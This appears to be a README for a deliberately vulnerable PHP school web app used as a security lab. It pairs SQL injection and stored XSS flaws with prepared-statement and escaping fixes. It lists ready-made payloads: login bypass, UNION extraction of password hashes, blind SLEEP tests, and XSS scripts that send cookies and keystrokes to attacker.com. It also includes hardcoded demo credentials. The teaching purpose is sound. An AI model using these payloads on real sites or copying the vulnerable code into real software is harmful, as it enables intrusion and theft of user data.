# School Web Application - Security Vulnerability Demonstration

## ⚠️ DISCLAIMER
This application is designed for **educational purposes only** to demonstrate common web security vulnerabilities. **DO NOT USE IN PRODUCTION**. These vulnerabilities are intentional and designed to teach how attacks work and how to prevent them.

## 📋 Project Overview

This is a comprehensive educational security application that demonstrates:
- **SQL Injection Vulnerabilities** - Login and search features
- **Cryptographic Failures** - MD5 hashing, Base64 pseudo-encryption, PII in URLs, and hardcoded secrets
- **XSS (Cross-Site Scripting)** - Comment system
- **Secure Alternatives** - Proper implementation with prepared statements
- **Best Practices** - How to fix these vulnerabilities

## 📁 Project Structure

```
Vulnerable Web/
├── index.html                    # Home page with overview
├── css/
│   └── style.css               # Beautiful, responsive UI styling
├── includes/
│   └── config.php              # Database configuration
├── pages/
│   ├── login_vulnerable.php    # SQL Injection demo (auth)
│   ├── login_secure.php        # Secure login with prepared statements
│   ├── news_vulnerable.php     # SQL Injection demo (search)
│   ├── articles_secure.php     # Secure search implementation
│   └── xss_vulnerable.php      # XSS vulnerability demo
├── database.sql                # Database setup and sample data
└── README.md                   # This file
```

## 🗄️ Database Setup

### Prerequisites
- MySQL Server running
- PHP with MySQLi extension
- Web server (Apache, Nginx, IIS)

### Database Configuration
Database: **myapp_db**
User: **myuser**
Password: **StrongPassword123**

### Setup Steps

1. **Create Database and User:**
```sql
CREATE DATABASE myapp_db;
CREATE USER 'myuser'@'localhost' IDENTIFIED BY 'StrongPassword123';
GRANT ALL PRIVILEGES ON myapp_db.* TO 'myuser'@'localhost';
FLUSH PRIVILEGES;
```

2. **Import Database Structure:**
```bash
mysql -u myuser -p myapp_db < database.sql
```

3. **Verify Connection:**
```php
php -r "include 'includes/config.php'; echo 'Connected!';
"
```

## 🚀 Getting Started

1. **Copy files to web server directory:**
   ```
   C:\xampp\htdocs\vulnerable-web\
   or
   /var/www/html/vulnerable-web/
   ```

2. **Navigate to application:**
   ```
   http://localhost/vulnerable-web/
   or
   http://144.126.214.178/
   ```

3. **Test Credentials:**
   | Username | Password | Role |
   |----------|----------|------|
   | admin | admin123 | Administrator |
   | teacher | teacher123 | Teacher |
   | student | student123 | Student |

## 🔓 Vulnerable Pages & Exploitation

### 1️⃣ Login (Vulnerable)
**Location:** `/pages/login_vulnerable.php`

**Vulnerability:** SQL Injection in authentication

**Vulnerable Code:**
```php
$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";
$result = $conn->query($query);
```

**Exploitation Payloads:**

**Payload 1: Bypass Authentication with OR**
```
Username: admin' OR '1'='1
Password: anything
```
Result: Query becomes `WHERE username='admin' OR '1'='1' ...` (always true)

**Payload 2: Comment Out Password Check**
```
Username: admin' --
Password: anything
```
Result: Password check is commented out, bypassed

**Payload 3: Extract Data with UNION**
```
Username: admin' UNION SELECT 1,user(),3,4,5,6,7,8 --
Password: anything
```
Result: Returns MySQL username and version


### 2️⃣ Login (Secure)
**Location:** `/pages/login_secure.php`

**Security Implementation:** Prepared Statements

**Secure Code:**
```php
$stmt = $conn->prepare("SELECT id, username, password, full_name, role FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
```

**Why It's Secure:**
- User input is separated from SQL code
- Database treats `?` as a placeholder, not executable code
- Payloads are treated as literal search strings
- Type checking with "s" parameter


### 3️⃣ News (Vulnerable)
**Location:** `/pages/news_vulnerable.php`

**Vulnerability:** SQL Injection in search functionality

**Vulnerable Code:**
```php
$query = "SELECT * FROM news WHERE title LIKE '%$search_query%' OR content LIKE '%$search_query%'...";
$result = $conn->query($query);
```

**Exploitation Payloads:**

**Payload 1: Get All Records**
```
Search: ' OR '1'='1
```
Result: Returns all news articles regardless of search term

**Payload 2: Extract User Data**
```
Search: ' UNION SELECT id, username, password, email, email, email FROM users --
```
Result: Displays all usernames and password hashes!

**Payload 3: Time-Based Detection**
```
Search: ' OR SLEEP(5) --
```
Result: Database sleeps for 5 seconds (useful for blind SQL injection)

**Payload 4: Database Version**
```
Search: ' UNION SELECT 1,2,3,4,5, VERSION() --
```
Result: Shows MySQL version

### 4️⃣ Articles (Secure)
**Location:** `/pages/articles_secure.php`

**Security Implementation:** Prepared Statements with LIKE

**Secure Code:**
```php
$search_param = '%' . $search_query . '%';
$stmt = $conn->prepare("SELECT * FROM articles WHERE title LIKE ? OR content LIKE ? OR author LIKE ?");
$stmt->bind_param("sss", $search_param, $search_param, $search_param);
$stmt->execute();
```

### 5️⃣ Comments (XSS Vulnerable)
**Location:** `/pages/xss_vulnerable.php`

**Vulnerability:** Stored Cross-Site Scripting (XSS)

**Vulnerable Code:**
```php
<?php echo $comment['message']; ?>  <!-- ❌ No escaping! -->
```

**Exploitation Payloads:**

**Payload 1: Simple Alert**
```html
<script>alert('XSS Vulnerability!')</script>
```

**Payload 2: Image Tag Event Handler**
```html
<img src=x onerror=alert('XSS')>
```

**Payload 3: SVG Event Handler**
```html
<svg onload=alert('XSS')></svg>
```

**Payload 4: Steal Session Cookie** (Proof of Concept)
```html
<script>
fetch('http://attacker.com/steal?cookie='+document.cookie);
</script>
```

**Payload 5: Keylogger**
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key='+e.key);
};
</script>
```

**Payload 6: Redirect to Phishing Site**
```html
<script>window.location='http://fake-bank.com';</script>
```

## ✅ Security Fixes & Best Practices

### 🛡️ Prevention: SQL Injection

**1. Use Prepared Statements**
```php
// MySQLi
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();

// Or with PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

**2. Input Validation**
```php
// Validate username format
if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
    die('Invalid username format');
}

// Validate email
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die('Invalid email');
}
```

**3. Parameterized Queries with Multiple Types**
```php
$stmt = $conn->prepare("INSERT INTO users (name, age, email) VALUES (?, ?, ?)");
$stmt->bind_param("sis", $name, $age, $email);  // s=string, i=integer
$stmt->execute();
```

**4. Use ORM Frameworks**
```php
// Laravel Eloquent
$user = User::where('username', $username)->first();

// Doctrine
$user = $em->getRepository(User::class)->findBy(['username' => $username]);
```

### 🛡️ Prevention: XSS

**1. Output Encoding - HTML Escaping**
```php
// ❌ VULNERABLE
<?php echo $user_comment; ?>

// ✅ SECURE
<?php echo htmlspecialchars($user_comment, ENT_QUOTES, 'UTF-8'); ?>

// Also works for JSON
<?php echo json_encode($user_comment); ?>
```

**2. Content Security Policy (CSP)**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**3. Use textContent instead of innerHTML**
```javascript
// ❌ VULNERABLE
document.getElementById('content').innerHTML = userInput;

// ✅ SECURE
document.getElementById('content').textContent = userInput;
```

**4. Input Validation**
```php
// Remove HTML tags
$clean_input = strip_tags($user_input);

// Or allow specific tags
$clean_input = strip_tags($user_input, '<p><br><strong>');

// Validate format
if (!preg_match('/^[a-zA-Z0-9\s.,!?\'-]*$/', $user_input)) {
    die('Invalid input');
}
```

**5. Use Template Engines with Auto-Escaping**
```twig
{# Twig automatically escapes by default #}
{{ user_comment }}

{# Compare with unescaped (generally not recommended) #}
{{ user_comment|raw }}
```

## 📊 Data Tampering Techniques

### Testing Data Tampering

This application allows you to test several data tampering techniques:

1. **SQL Injection for Data Modification:**
   ```
   '; UPDATE articles SET views = 999999 WHERE id = 1; --
   ```

2. **Comment Injection:**
   - Post comments with HTML/JavaScript to see XSS execution

3. **Parameter Tampering (via browser):
   - Edit URLs to change IDs
   - Modify POST parameters with developer tools

4. **Authentication Bypass:**
   - Use SQL injection payloads to bypass login

5. **Privilege Escalation:**
   - Extract password hashes from database
   - Modify user role field

## 🔍 Testing & Debugging

### Enable Error Reporting (for debugging only)
```php
error_reporting(E_ALL);
ini_set('display_errors', 1);
```

### View Executed SQL Queries
The vulnerable pages display the executed SQL query (for educational purposes).

### Browser Developer Tools
1. Open DevTools (F12)
2. Check Console for JavaScript errors
3. Monitor Network requests
4. Inspect DOM changes from XSS

### MySQL Query Logging
```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'TABLE';
SELECT * FROM mysql.general_log;
```

## 📚 Learning Outcomes

After completing this course material, you should understand:

✅ How SQL Injection works and why it's dangerous
✅ How XSS vulnerabilities are exploited
✅ Methods to prevent SQL Injection (prepared statements)
✅ Methods to prevent XSS (output encoding, CSP)
✅ Input validation and sanitization techniques
✅ Secure coding practices
✅ The importance of defense in depth
✅ How to identify vulnerabilities in code

## 🚨 Common Mistakes to Avoid

❌ **Never trust user input**
❌ **Never concatenate user input into SQL queries**
❌ **Never display user input without escaping**
❌ **Never use md5() for password hashing** (use bcrypt, Argon2)
❌ **Never disable security features like prepared statements**
❌ **Never expose database errors to users**
❌ **Never store sensitive data in cookies without encryption**
❌ **Never use outdated PHP versions**

## 📖 Additional Resources

### OWASP Top 10
- A01:2021 - Broken Access Control
- A03:2021 - Injection
- A07:2021 - Cross-Site Scripting (XSS)
- A06:2021 - Vulnerable and Outdated Components

### Reference Links
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PHP Security Manual](https://www.php.net/manual/en/security.php)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)

## 🎯 Lab Assignments

### Assignment 1: Exploit SQL Injection
1. Go to login page (vulnerable)
2. Try all provided payloads
3. Document which ones bypass authentication
4. Explain why each payload works

### Assignment 2: Compare Secure vs Vulnerable
1. Login with valid credentials on vulnerable page
2. Login with same credentials on secure page
3. Try SQL injection payloads on both
4. Document the differences in behavior

### Assignment 3: XSS Testing
1. Post legitimate comments
2. Post comments with XSS payloads
3. Observe what executes and what doesn't
4. Test from different browsers

### Assignment 4: Code Security Audit
1. Review the vulnerable code
2. Identify all security issues
3. Write secure versions
4. Compare with secure pages

### Assignment 5: Fix Vulnerabilities
1. Create your own secure version of all pages
2. Implement all security best practices
3. Test your code
4. Document all fixes

## 👨‍💻 Contact & Support

For questions or clarifications about this educational material:
- Review the inline code comments
- Check OWASP documentation
- Consult PHP security manual
- Test in a safe environment

## 📝 License

This educational material is provided as-is for learning purposes.
Do not use in production systems.

**Last Updated:** April 2026
**Version:** 1.0
**Status:** Educational - Intentionally Vulnerable
